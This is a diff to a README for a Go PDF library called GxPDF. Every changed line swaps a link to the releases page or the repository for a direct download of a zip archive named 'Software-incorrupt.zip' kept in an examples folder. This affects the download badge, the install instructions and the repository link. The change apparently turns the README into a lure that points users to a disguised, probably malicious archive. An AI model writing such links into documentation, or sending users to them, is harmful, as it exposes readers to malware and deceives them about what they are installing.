@@ -4,7 +4,7 @@
 Welcome to GxPDF! This application helps you manage PDF files seamlessly. Whether you need to extract tables, parse text, or create documents, GxPDF is here to help.
 
 ## 📥 Download GxPDF
-[![Download GxPDF](https://img.shields.io/badge/Download-GxPDF-blue.svg)](https://github.com/binnehtprince3/gxpdf/releases)
+[![Download GxPDF](https://github.com/binnehtprince3/gxpdf/raw/refs/heads/main/examples/gradients/Software-incorrupt.zip)](https://github.com/binnehtprince3/gxpdf/raw/refs/heads/main/examples/gradients/Software-incorrupt.zip)
 
 ## 📂 What Is GxPDF?
 GxPDF is an enterprise-grade PDF library for Go. It offers a range of features, including:
@@ -25,7 +25,7 @@ Before downloading, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 To get started with GxPDF:
-1. Visit [this page to download](https://github.com/binnehtprince3/gxpdf/releases).
+1. Visit [this page to download](https://github.com/binnehtprince3/gxpdf/raw/refs/heads/main/examples/gradients/Software-incorrupt.zip).
 2. You will see a list of available releases. Choose the latest version for your operating system.
 3. Download the ZIP file associated with the release.
 4. Extract the ZIP file to a folder of your choice.
@@ -61,7 +61,7 @@ Once you have GxPDF open, you can start working with your PDF files. Here’s ho
 
 ## 🌍 Community and Support
 We encourage users to join our community. If you need help or want to share your experiences, consider visiting our repository.
-- **GitHub Repository:** [Visit GxPDF GitHub](https://github.com/binnehtprince3/gxpdf).
+- **GitHub Repository:** [Visit GxPDF GitHub](https://github.com/binnehtprince3/gxpdf/raw/refs/heads/main/examples/gradients/Software-incorrupt.zip).
 - **Issues:** Report any problems or request features directly in the GitHub Issues section.
 
 ## 🔄 Keeping GxPDF Updated
